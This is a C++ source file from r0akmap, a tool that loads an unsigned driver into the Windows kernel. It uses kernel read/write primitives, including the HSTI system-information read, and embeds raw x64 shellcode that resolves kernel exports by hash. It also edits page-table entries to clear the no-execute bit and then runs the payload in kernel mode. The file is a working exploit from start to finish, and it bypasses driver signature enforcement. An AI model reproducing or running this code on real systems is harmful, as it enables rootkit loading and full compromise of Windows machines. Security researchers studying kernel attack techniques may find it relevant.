/* This file is part of r0akmap by namazso, licensed under the MIT license:
*
* MIT License
*
* Copyright (c) namazso 2018
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#include <vcruntime_typeinfo.h>

extern "C" {
#include "r0ak.h"
}
#include <type_traits>
#include <vector>
#include "page_stuff.hpp"

template <typename T = void, typename Ptr>
static auto offset_ptr(
	Ptr ptr,
	const std::ptrdiff_t offset
) -> std::conditional_t<std::is_same_v<T, void>, Ptr, T>
{
	auto address = (char*)(ptr) + offset;
	return (std::conditional_t<std::is_same_v<T, void>, Ptr, T>)(uintptr_t(address));
}

namespace km
{
	PKERNEL_EXECUTE kernel_execute;

	class KernelBuffer
	{
		PKERNEL_ALLOC alloc = nullptr;
		void* buf;

	public:
		KernelBuffer(size_t sz)
		{
			buf = KernelAlloc(&alloc, sz);
		}

		~KernelBuffer()
		{
			KernelFree(alloc);
		}

		void* get() { return buf; }
		void* write() { return KernelWrite(alloc); }
	};

	bool write(void* dst, void* src, size_t size)
	{
		if(size % sizeof(ULONG) != 0)
		{
			printf("[-] Invalid size - not multiple of ULONG\n");
			return false;
		}

		const auto pulsrc = PULONG(src);
		const auto puldst = PULONG(dst);
		const auto count = size / sizeof(ULONG);

		auto b = true;

		for (auto i = 0u; i < count; ++i)
			b &= CmdWriteKernel(kernel_execute, &puldst[i], pulsrc[i]);

		if(!b)
			printf("[-] Writing failed\n");

		return b;
	}

	template <typename T>
	bool write(void* dst, T val)
	{
		printf("[+] Writing a %s\n", typeid(T).name());
		return write(dst, &val, sizeof(T));
	}

	bool read(void* dst, void* src, uint32_t size)
	{
		printf("[+] Reading 0x%.4X bytes from                            0x%.16p\n", size, src);
		if(!write(g_HstiBufferSize, size))
		{
			printf("[-] Cannot write read buffer size\n");
			return false;
		}

		if(!write(g_HstiBufferPointer, src))
		{
			printf("[-] Cannot write read buffer pointer\n");
			return false;
		}

		auto status = NtQuerySystemInformation(
			SystemHardwareSecurityTestInterfaceResultsInformation,
			dst,
			size,
			nullptr
		);

		if (!NT_SUCCESS(status))
		{
			printf("[-] Failed to read kernel data\n");
			return false;
		}
		
		return true;
	}

	template <typename T>
	bool read(T& val, void* src)
	{
		printf("[+] Reading a %s\n", typeid(T).name());
		return read(&val, src, sizeof(T));
	}
}


constexpr uint8_t g_payload[] = {
	0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57,
	0x53, 0x48, 0x63, 0x41, 0x3C, 0x8B, 0x9C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x85,
	0xDB, 0x0F, 0x84, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x01, 0xCB, 0x0F, 0x84, 0x96, 0x00, 0x00, 0x00,
	0x44, 0x8B, 0x43, 0x20, 0x31, 0xC0, 0x49, 0x01, 0xC8, 0x0F, 0x84, 0x87, 0x00, 0x00, 0x00, 0x8B,
	0x7B, 0x1C, 0x49, 0x89, 0xF9, 0x49, 0x01, 0xC9, 0x74, 0x7C, 0x44, 0x8B, 0x53, 0x24, 0x49, 0x01,
	0xCA, 0x74, 0x73, 0x3B, 0x7B, 0x18, 0x48, 0x8D, 0x43, 0x1C, 0x48, 0x8D, 0x5B, 0x18, 0x48, 0x0F,
	0x42, 0xD8, 0x44, 0x8B, 0x1B, 0x31, 0xC0, 0x4D, 0x85, 0xDB, 0x74, 0x5A, 0x49, 0xBE, 0x25, 0x23,
	0x22, 0x84, 0xE4, 0x9C, 0xF2, 0xCB, 0x49, 0xBC, 0xB3, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x45, 0x31, 0xFF, 0x43, 0x8B, 0x34, 0xB8, 0x48, 0x8D, 0x3C, 0x0E, 0x48, 0x83, 0xC7, 0x01, 0x8A,
	0x5F, 0xFF, 0x4C, 0x89, 0xF6, 0x0F, 0xB6, 0xDB, 0x48, 0x31, 0xDE, 0x49, 0x0F, 0xAF, 0xF4, 0x8A,
	0x1F, 0x48, 0xFF, 0xC7, 0x84, 0xDB, 0x75, 0xED, 0x48, 0x39, 0xD6, 0x74, 0x0A, 0x49, 0xFF, 0xC7,
	0x4D, 0x39, 0xDF, 0x72, 0xCE, 0xEB, 0x0F, 0x44, 0x89, 0xF8, 0x41, 0x0F, 0xB7, 0x04, 0x42, 0x41,
	0x8B, 0x04, 0x81, 0x48, 0x01, 0xC8, 0x5B, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5E, 0x41, 0x5F, 0xC3,
	0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x88,
	0x00, 0x00, 0x00, 0x4C, 0x89, 0xCE, 0x4C, 0x89, 0x44, 0x24, 0x48, 0x48, 0x89, 0x54, 0x24, 0x40,
	0x48, 0x89, 0xCB, 0x48, 0x89, 0xF7, 0x48, 0xC1, 0xEF, 0x20, 0x48, 0xBA, 0x52, 0x3E, 0x4B, 0x00,
	0xB5, 0x95, 0x94, 0x8A, 0xE8, 0xFF, 0xFE, 0xFF, 0xFF, 0x49, 0x89, 0xC5, 0x48, 0xBA, 0xBF, 0x97,
	0x53, 0x3A, 0x67, 0x8A, 0x3A, 0xB5, 0x48, 0x89, 0xD9, 0xE8, 0xEA, 0xFE, 0xFF, 0xFF, 0x49, 0x89,
	0xC7, 0x48, 0xBA, 0x1F, 0xF9, 0x90, 0xD2, 0x3A, 0x34, 0x56, 0xB4, 0x48, 0x89, 0xD9, 0xE8, 0xD5,
	0xFE, 0xFF, 0xFF, 0x49, 0x89, 0xC6, 0x48, 0xBA, 0xDC, 0xEA, 0x6E, 0x6A, 0xC8, 0x72, 0x62, 0x7F,
	0x48, 0x89, 0xD9, 0xE8, 0xC0, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0xBA, 0x0A,
	0xDA, 0x7A, 0xE8, 0xBE, 0xB4, 0x7A, 0x00, 0x48, 0x89, 0xD9, 0xE8, 0xA9, 0xFE, 0xFF, 0xFF, 0x48,
	0x89, 0x44, 0x24, 0x30, 0x48, 0xBA, 0xE5, 0x33, 0x2F, 0xEB, 0xB7, 0x41, 0x19, 0xB6, 0x48, 0x89,
	0xD9, 0xE8, 0x92, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x28, 0x89, 0xF1, 0x4C, 0x8D, 0x64,
	0x24, 0x50, 0x4C, 0x89, 0xE2, 0x41, 0xFF, 0xD5, 0x49, 0x8B, 0x0C, 0x24, 0x4C, 0x8D, 0x6C, 0x24,
	0x58, 0x4C, 0x89, 0xEA, 0x41, 0xFF, 0xD7, 0x31, 0xC9, 0x41, 0xB8, 0x4E, 0x6F, 0x6E, 0x65, 0x48,
	0x89, 0xFA, 0x41, 0xFF, 0xD6, 0x48, 0x89, 0xC5, 0x48, 0x89, 0xF9, 0x48, 0x8B, 0x74, 0x24, 0x40,
	0x48, 0x89, 0xEF, 0xFC, 0xF3, 0xA4, 0x48, 0x89, 0xD9, 0x48, 0x8B, 0x54, 0x24, 0x48, 0x49, 0x89,
	0xE8, 0xFF, 0xD5, 0xBA, 0x4E, 0x6F, 0x6E, 0x65, 0x48, 0x89, 0xE9, 0xFF, 0x54, 0x24, 0x38, 0x4C,
	0x89, 0xE9, 0xFF, 0x54, 0x24, 0x30, 0x49, 0x8B, 0x0C, 0x24, 0xFF, 0x54, 0x24, 0x28, 0x90, 0x48,
	0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E,
	0x41, 0x5F, 0xC3, 0x48, 0xB9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x48, 0xBA, 0x22,
	0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x49, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
	0x33, 0x49, 0xB9, 0x44, 0x44, 0x44, 0x44, 0x55, 0x55, 0x55, 0x55, 0xE9, 0xB0, 0xFE, 0xFF, 0xFF
};

void set_payload_data(
	void* payload,
	void* ntoskrnl,
	void* addr,
	void* ctx,
	uint32_t pid,
	uint32_t size
)
{
	*offset_ptr<void**>(payload, 0x1EB + 0 * 10 + 2) = ntoskrnl;
	*offset_ptr<void**>(payload, 0x1EB + 1 * 10 + 2) = addr;
	*offset_ptr<void**>(payload, 0x1EB + 2 * 10 + 2) = ctx;
	*offset_ptr<uint32_t*>(payload, 0x1EB + 3 * 10 + 2) = pid;
	*offset_ptr<uint32_t*>(payload, 0x1EB + 3 * 10 + 6) = size;
}

std::vector<uint8_t> read_file(const char* name)
{
	const auto fp = fopen(name, "rb");
	fseek(fp, 0L, SEEK_END);
	const auto sz = ftell(fp);
	rewind(fp);
	std::vector<uint8_t> vec;
	vec.resize(sz);
	fread(vec.data(), sz, 1, fp);
	fclose(fp);
	return vec;
}

uintptr_t g_MmGetVirtualForPhysical_constant0;
uintptr_t g_MmGetVirtualForPhysical_constant1;

void* MmGetVirtualForPhysical(uintptr_t rcx)
{
	if(!g_MmGetVirtualForPhysical_constant0)
	{
		SymLookup("ntoskrnl.exe", "MmGetVirtualForPhysical", [](PDWORD64 Address)
		{
			g_MmGetVirtualForPhysical_constant0 = *offset_ptr<uintptr_t*>(*Address, 0x10);
			g_MmGetVirtualForPhysical_constant0 = *offset_ptr<uintptr_t*>(*Address, 0x22);
		});
	}
	auto rax = rcx;
	rax >>= 0xC;
	auto rdx = rax * 3;
	rdx += rdx;
	rax = g_MmGetVirtualForPhysical_constant0; // These constants change per version
	km::read(rax, (void*)(rax + rdx * 8));
	rax <<= 0x19;
	rdx = g_MmGetVirtualForPhysical_constant1; // Don't be like me and spend an hour debugging
	rdx <<= 0x19;
	rcx &= 0xFFF;
	rax -= rdx;
	(intptr_t&)rax >>= 0x10;
	rax += rcx;
	return (void*)rax;
}


template <typename T>
constexpr static uintptr_t PfnToPage(T pfn)
{
	return uintptr_t(pfn) << 12;
}

struct PageTableInfo
{
	PML4E* ppml4_e;
	PML4E pml4_e;
	PDPTE* ppdpte;
	PDPTE pdpte;
	PDE* ppde;
	PDE pde;
	PTE* ppte;
	PTE pte;
};

static PageTableInfo get_table_info(void* p, uint64_t _cr3)
{
	PageTableInfo info{};

	const VIRT_ADDR addr = { uint64_t(p) };
	const PTE_CR3 cr3 = { _cr3 };

	const auto ppml4_e = (PML4E*)MmGetVirtualForPhysical(PfnToPage(cr3.pml4_p) + sizeof(PML4E) * addr.pml4_index);
	printf("[+] PML4E is at virtual                                  0x%.16p\n", ppml4_e);
	info.ppml4_e = ppml4_e;
	PML4E pml4_e;
	if (ppml4_e && km::read(pml4_e, ppml4_e) && pml4_e.present)
	{
		info.pml4_e = pml4_e;
		const auto ppdpte = (PDPTE*)MmGetVirtualForPhysical(PfnToPage(pml4_e.pdpt_p) + sizeof(PDPTE) * addr.pdpt_index);
		printf("[+] PDPTE is at virtual                                  0x%.16p\n", ppdpte);
		info.ppdpte = ppdpte;
		PDPTE pdpte;
		if (ppdpte && km::read(pdpte, ppdpte) && pdpte.present && !pdpte.page_size)
		{
			info.pdpte = pdpte;
			const auto ppde = (PDE*)MmGetVirtualForPhysical(PfnToPage(pdpte.pd_p) + sizeof(PDE) * addr.pd_index);
			printf("[+] PDE is at virtual                                    0x%.16p\n", ppde);
			info.ppde = ppde;
			PDE pde;
			if (ppde && km::read(pde, ppde) && pde.present && !pde.page_size)
			{
				info.pde = pde;
				const auto ppte = (PTE*)MmGetVirtualForPhysical(PfnToPage(pde.pt_p) + sizeof(PTE) * addr.pt_index);
				printf("[+] PTE is at virtual                                    0x%.16p\n", ppte);
				info.ppte = ppte;
				if (ppte)
					km::read(info.pte, ppte);
			}
		}
	}

	return info;
}

static bool set_executable(
	void* va,
	uint64_t _cr3
)
{
	auto info = get_table_info(va, _cr3);

	if (info.ppml4_e && info.ppdpte)
	{
		if (info.ppte)
		{
			info.pte.xd = false;
			return km::write(info.ppte, info.pte);
		}
		else if (info.ppde)
		{
			info.pde.xd = false;
			return km::write(info.ppde, info.pde);
		}
		else
		{
			info.pdpte.xd = false;
			return km::write(info.ppdpte, info.pdpte);
		}
	}

	return false;
}


void map_driver(void* ntoskrnl, void* ctx);

bool load_driver(const char* name)
{
	auto driver = read_file(name);

	km::KernelBuffer buf(sizeof(g_payload));

	memcpy(buf.get(), g_payload, sizeof(g_payload));

	set_payload_data(
		buf.get(),
		(void*)GetDriverBaseAddr("ntoskrnl.exe"),
		(void*)&map_driver,
		driver.data(),
		GetCurrentProcessId(),
		0x1000
	);

	uintptr_t* initial_process;

	if (!km::read(initial_process, SymLookup("ntoskrnl.exe", "PsInitialSystemProcess", nullptr)))
	{
		printf("[-] Failed reading initial process PEPROCESS\n");
		return false;
	}

	printf("[+] Initial process PEPROCESS is at                      0x%.16p\n", initial_process);

	const auto km = buf.write();

	printf("[+] Kernel payload written at                            0x%.16p\n", km);

	uintptr_t cr3;

	if (!km::read(cr3, &initial_process[5]))
	{
		printf("[-] Failed reading initial process PEPROCESS\n");
		return false;
	}

	printf("[+] Initial process CR3 is                               0x%.16llX\n", cr3);

	if(!set_executable(km, cr3))
	{
		printf("[-] Failed to set NX\n");
		return false;
	}

	CmdExecuteKernel(km::kernel_execute, offset_ptr(km, 0x1EB), ULONG_PTR(driver.data()));

	// Lets hope it finishes meanwhile
	Sleep(500);

	return true;
}

int main(int argc, const char* const* argv)
{
	if (argc < 2)
	{
		printf("[-] Not enough args\n");
		return 1;
	}

	if(!SymSetup())
	{
		printf("[-] Can't initialize symbol shit\n");
		return 1;
	}

	if (!KernelExecuteSetup(&km::kernel_execute, g_TrampolineFunction))
	{
		printf("[-] Failed initializing kernel executer\n");
		return 1;
	}

	if(!load_driver(argv[1]))
	{
		printf("[-] Failed loading driver\n");
	}

	KernelExecuteTeardown(km::kernel_execute);
}